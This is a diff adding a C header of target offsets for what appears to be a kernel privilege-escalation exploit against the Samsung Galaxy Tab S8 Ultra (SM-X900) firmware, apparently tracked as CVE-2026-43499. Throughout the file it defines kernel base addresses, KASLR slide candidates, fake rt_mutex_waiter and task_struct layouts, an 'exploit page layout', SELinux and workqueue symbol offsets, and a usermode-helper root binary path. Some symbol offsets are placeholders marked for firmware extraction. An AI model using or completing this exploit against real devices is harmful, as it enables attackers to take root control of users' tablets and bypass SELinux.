@@ -1,0 +1,236 @@
+#ifndef OFFSET_H
+#define OFFSET_H
+
+#if defined(APP_PAYLOAD) && APP_PAYLOAD
+#define BUILD_VARIANT_LABEL "gts8x-X900XXSBEZE1-app-physical-p0-oracle"
+#define APP_PHYS_P0_ORACLE 1
+#else
+#define BUILD_VARIANT_LABEL "gts8x-X900XXSBEZE1-root-umh"
+#endif
+#ifndef BUILD_FINGERPRINT
+#define BUILD_FINGERPRINT \
+  "samsung/gts8xwifi/gts8x:16/BP2A.250605.031.A3/X900XXSBEZE1:user/release-keys"
+#endif
+
+/*
+ * SM-X900 (Galaxy Tab S8 Ultra Wi-Fi)
+ * SoC:    Qualcomm SM8450 (Snapdragon 8 Gen 1)
+ * Kernel: 5.10.236-android12-9-32140295-abX900XXSBEZE1
+ * Build:  BP2A.250605.031.A3.X900XXSBEZE1
+ * Patch:  2026-05-05
+ * SDK:    36 (Android 16 / One UI 8.0)
+ *
+ * Struct layout offsets are derived from Samsung android12-5.10 GKI source
+ * (akm-04/Samsung_Kernel_sm8450_common_gts8x, branch common_android12-5.10).
+ * Same GKI branch as A15 (5.10.226); struct layouts are identical across
+ * 5.10 sublevel patches.
+ *
+ * Symbol offsets (lines marked EXTRACT) require kallsyms extraction from
+ * the SM-X900 firmware X900XXSBEZE1 boot.img → vmlinux.
+ *
+ * Physical memory map: SM8450 DRAM base 0x80000000 (standard Qualcomm).
+ * P0_KERNEL_PHYS_LOAD must be verified from boot.img header kernel_addr.
+ */
+
+#define KIMAGE_TEXT_BASE 0xffffffc008000000ULL
+#define P0_PAGE_OFFSET 0xffffff8000000000ULL
+#define P0_PHYS_OFFSET 0x80000000ULL
+#define P0_KERNEL_PHYS_LOAD 0x80000000ULL
+#define SKB_DATA_DELTA (-0xe80LL)
+
+#define MM_STRUCT_SZ 0x3c0
+#define MM_ORDER 3
+#define KMALLOC_CGROUP_TYPE 0
+#define KMALLOC_CACHE_TYPES 2
+#define LEGACY_RT_MUTEX_WAITER 1
+
+#define SLIDE_FAKE_WAITER_PRIO 0
+#define SLIDE_LOCK_OWNER_VALUE 1ULL
+#define SLIDE_USE_FAKE_TASK 1
+#define SLIDE_TRACEFS_EVENT_ID 0       /* EXTRACT: from tracefs sched:sched_blocked_reason */
+#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x0ULL /* EXTRACT: instruction after bl schedule in worker_thread */
+#define SLIDE_PSELECT_WORD_SHIFT 0
+#define SLIDE_P0_OFFSET_CANDIDATES \
+  0x000000ULL, 0x010000ULL, 0x020000ULL, 0x030000ULL, \
+  0x040000ULL, 0x050000ULL, 0x060000ULL, 0x070000ULL, \
+  0x080000ULL, 0x090000ULL, 0x0a0000ULL, 0x0b0000ULL, \
+  0x0c0000ULL, 0x0d0000ULL, 0x0e0000ULL, 0x0f0000ULL, \
+  0x100000ULL, 0x110000ULL, 0x120000ULL, 0x130000ULL, \
+  0x140000ULL, 0x150000ULL, 0x160000ULL, 0x170000ULL, \
+  0x180000ULL, 0x190000ULL, 0x1a0000ULL, 0x1b0000ULL, \
+  0x1c0000ULL, 0x1d0000ULL, 0x1e0000ULL, 0x1f0000ULL
+#define SLIDE_MAX_ATTEMPTS 32
+
+#if defined(APP_PAYLOAD) && APP_PAYLOAD
+#define ROUTE_WAIT_SECONDS 8
+#define PSELECT_ENTER_DELAY_USEC 50000
+#define SLIDE_PSELECT_TIMEOUT_NSEC 100000000L
+#define SLIDE_KSNITCH_APPENDED_FUTEXES 2048
+#define SLIDE_KSNITCH_REPEAT_MEASUREMENT 64
+#define SLIDE_KSNITCH_AVERAGE 8
+#define SLIDE_BANK_SLOTS 4
+#define SLIDE_BANK_TASK_OFF 0x1000
+#define SLIDE_BANK_TASK_STRIDE 0x1c0
+#define SLIDE_BANK_LOCK_OFF 0x5200
+#define SLIDE_BANK_SLOT_STRIDE 0x100
+#define SLIDE_BANK_WAITER_OFF 0x40
+#define P0_ORACLE_GATE_SLOT 0
+#define P0_ORACLE_PROBE_SLOT 1
+#define P0_ORACLE_GATE_RESTORE_SLOT 2
+#define P0_ORACLE_PROBE_RESTORE_SLOT 3
+#define P0_ORACLE_GATE_PAGE_OFF 0x0e80
+#define P0_ORACLE_GATE_OBJECT_INDEX 1
+#define P0_ORACLE_PROBE_OFFSET 0x1f0000ULL
+#define P0_FINGERPRINT_HEADER \
+  "targets/gts8x-X900XXSBEZE1/p0_fingerprint.h"
+#endif
+
+#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
+#define KERNELSNITCH_IDENTITY_END 0xffffff9000000000ULL
+#define DIRECT_MAP_BASE 0xffffff8000000000ULL
+#define DIRECT_MAP_END 0xffffffc000000000ULL
+#define VMEMMAP_START 0xfffffffeffe00000ULL
+
+/* ===== SYMBOL OFFSETS — EXTRACT FROM FIRMWARE vmlinux via kallsyms ===== */
+#define ASHMEM_MISC_FOPS_OFF 0x0ULL         /* EXTRACT: ashmem_misc miscdevice .fops */
+#define ASHMEM_FOPS_OFF 0x0ULL              /* EXTRACT: ashmem_fops */
+#define ASHMEM_IOCTL_OFF 0x0ULL             /* EXTRACT: ashmem_ioctl */
+#define ASHMEM_COMPAT_IOCTL_OFF 0x0ULL      /* EXTRACT: compat_ashmem_ioctl */
+#define ASHMEM_MMAP_OFF 0x0ULL              /* EXTRACT: ashmem_mmap */
+#define ASHMEM_OPEN_OFF 0x0ULL              /* EXTRACT: ashmem_open */
+#define ASHMEM_RELEASE_OFF 0x0ULL           /* EXTRACT: ashmem_release */
+#define ASHMEM_SHOW_FDINFO_OFF 0x0ULL       /* EXTRACT: ashmem_show_fdinfo */
+#define CONFIGFS_READ_ITER_OFF 0x0ULL       /* EXTRACT: configfs_read_file */
+#define CONFIGFS_BIN_WRITE_ITER_OFF 0x0ULL  /* EXTRACT: configfs_write_bin_file */
+#define COPY_SPLICE_READ_OFF 0x0ULL         /* EXTRACT: generic_file_splice_read */
+#define NOOP_LLSEEK_OFF 0x0ULL              /* EXTRACT: noop_llseek */
+#define INIT_TASK_OFF 0x0ULL                /* EXTRACT: init_task */
+#define ROOT_TASK_GROUP_OFF 0x0ULL           /* EXTRACT: root_task_group */
+#define SELINUX_ENFORCING_OFF 0x0ULL        /* EXTRACT: selinux_state */
+#define KMALLOC_CACHES_OFF 0x0ULL           /* EXTRACT: kmalloc_caches */
+#define ANON_PIPE_BUF_OPS_OFF 0x0ULL        /* EXTRACT: anon_pipe_buf_ops */
+
+#define ASHMEM_MISC_FOPS (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
+#define ASHMEM_FOPS (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
+#define ASHMEM_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
+#define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
+#define ASHMEM_MMAP (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
+#define ASHMEM_OPEN (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
+#define ASHMEM_RELEASE (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
+#define ASHMEM_SHOW_FDINFO (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
+#define CONFIGFS_READ_ITER (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
+#define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
+#define COPY_SPLICE_READ (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
+#define NOOP_LLSEEK (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
+#define INIT_TASK (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
+#define ROOT_TASK_GROUP (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
+#define SELINUX_ENFORCING (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
+#define KMALLOC_CACHES (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
+#define ANON_PIPE_BUF_OPS (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
+
+#define ROOT_UMH_PATH "/data/local/tmp/cve-2026-43499-root"
+#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x0ULL /* EXTRACT: call_usermodehelper_exec_work */
+#define SYSTEM_UNBOUND_WQ_OFF 0x0ULL             /* EXTRACT: system_unbound_wq */
+#define CALL_USERMODEHELPER_EXEC_WORK \
+  (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_OFF)
+#define SYSTEM_UNBOUND_WQ (KIMAGE_TEXT_BASE + SYSTEM_UNBOUND_WQ_OFF)
+#define ROOT_UMH_WORK_OFF 0x6000
+#define ROOT_UMH_DATA_OFF 0x6200
+
+/* ===== SLIDE LEAK OBJECTS — EXTRACT FROM FIRMWARE vmlinux ===== */
+#define SLIDE_NFULNL_LOGGER_NAME_OFF 0x0ULL      /* EXTRACT: nfulnl_logger .name string */
+#define SLIDE_NFULNL_LOGGER_OBJECT_OFF 0x0ULL     /* EXTRACT: nfulnl_logger struct */
+#define SLIDE_RB_PARENT_TYPE_RESTORE 1ULL
+#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF 0x0ULL /* EXTRACT: boot_id sysctl data ptr */
+#define SLIDE_INIT_TASK_OFF INIT_TASK_OFF
+#define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF
+#define SLIDE_SYSCTL_BOOTID_OFF 0x0ULL            /* EXTRACT: sysctl_bootid */
+
+#define SLIDE_NFULNL_LOGGER_NAME_IMAGE \
+  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_NAME_OFF)
+#define SLIDE_NFULNL_LOGGER_OBJECT_IMAGE \
+  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OBJECT_OFF)
+#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE \
+  (KIMAGE_TEXT_BASE + SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF)
+#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
+#define SLIDE_ROOT_TASK_GROUP_IMAGE \
+  (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
+#define SLIDE_SYSCTL_BOOTID_IMAGE \
+  (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)
+
+/* ===== EXPLOIT PAGE LAYOUT — same as A15 5.10 ===== */
+#define LOCK_OFF 0x2210
+#define W0_OFF 0x2350
+#define FOPS_OFF 0x2000
+#define SCRATCH_OFF 0x3000
+#define RIGHT_OFF 0x4440
+#define LEFT_OFF 0x5550
+#define FAKE_TASK_OFF 0x3200
+
+/* ===== rt_mutex_waiter — 5.10 legacy 0x50-byte layout ===== */
+#define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x18
+#define FAKE_WAITER_TASK_OFF 0x30
+#define FAKE_WAITER_LOCK_OFF 0x38
+#define FAKE_WAITER_PRIO_OFF 0x40
+#define FAKE_WAITER_DEADLINE_OFF 0x48
+#define FAKE_WAITER_LAYOUT_SIZE 0x50
+
+/* ===== task_struct — android12-5.10 GKI layout (SM8450 same as A15) ===== */
+#define FAKE_TASK_USAGE_OFF 0x40
+#define FAKE_TASK_PRIO_OFF 0x84
+#define FAKE_TASK_NORMAL_PRIO_OFF 0x8c
+#define FAKE_TASK_TASK_GROUP_OFF 0x310
+#define FAKE_TASK_PI_LOCK_OFF 0x86c
+#define FAKE_TASK_PI_WAITERS_OFF 0x880
+#define FAKE_TASK_PI_TOP_TASK_OFF 0x890
+#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x898
+
+/* ===== configfs_bin_file — same across 5.10 ===== */
+#define CFG_PAGE_OFF 0x10
+#define CFG_NEEDS_READ_FILL_OFF 0x50
+#define CFG_BIN_BUFFER_OFF 0x58
+#define CFG_BIN_BUFFER_SIZE_OFF 0x60
+#define CFG_CB_MAX_SIZE_OFF 0x64
+
+/* ===== workqueue — 5.10 layout ===== */
+#define WQ_DFL_PWQ_OFF 0xb0
+#define PWQ_POOL_OFF 0x00
+#define PWQ_WQ_OFF 0x08
+#define PWQ_WORK_COLOR_OFF 0x10
+#define PWQ_REFCNT_OFF 0x18
+#define PWQ_NR_IN_FLIGHT_OFF 0x1c
+#define PWQ_NR_ACTIVE_OFF 0x58
+#define PWQ_MAX_ACTIVE_OFF 0x5c
+#define POOL_WORKLIST_OFF 0x20
+#define POOL_NR_IDLE_OFF 0x34
+
+#define WORK_DATA_OFF 0x00
+#define WORK_ENTRY_OFF 0x08
+#define WORK_FUNC_OFF 0x18
+
+/* ===== page / slab — standard ===== */
+#define STRUCT_PAGE_SIZE 0x40
+#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
+#define STRUCT_SLAB_CACHE_OFF 0x18
+#define STRUCT_PAGE_TYPE_OFF 0x30
+
+/* ===== pipe — standard ===== */
+#define PIPE_BUFFER_SLOTS 32
+#define PIPE_BUF_FLAG_CAN_MERGE 0x10
+
+/* ===== file_operations — standard ===== */
+#define FOPS_OWNER_OFF 0x00
+#define FOPS_LLSEEK_OFF 0x08
+#define FOPS_READ_OFF 0x10
+#define FOPS_WRITE_OFF 0x18
+#define FOPS_READ_ITER_OFF 0x20
+#define FOPS_WRITE_ITER_OFF 0x28
+#define FOPS_IOCTL_OFF 0x50
+#define FOPS_COMPAT_IOCTL_OFF 0x58
+#define FOPS_MMAP_OFF 0x60
+#define FOPS_OPEN_OFF 0x70
+#define FOPS_RELEASE_OFF 0x80
+#define FOPS_SPLICE_READ_OFF 0xc8
+#define FOPS_SHOW_FDINFO_OFF 0xe0
+
+#endif
